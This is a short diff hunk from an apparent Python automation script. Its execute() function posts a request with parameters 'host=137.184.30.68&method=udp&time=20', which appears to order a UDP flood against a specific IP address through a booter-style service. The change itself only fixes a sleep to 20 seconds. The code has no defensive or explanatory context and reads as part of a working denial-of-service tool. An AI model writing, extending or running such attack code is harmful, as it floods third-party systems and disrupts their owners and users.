@@ -53,6 +53,6 @@ def execute():
     print(url)
     time.sleep(2)
     requests.post(url+"?host=137.184.30.68&method=udp&time=20")
-    time.sleep(prelength)
+    time.sleep(20)
     driver.quit();
 
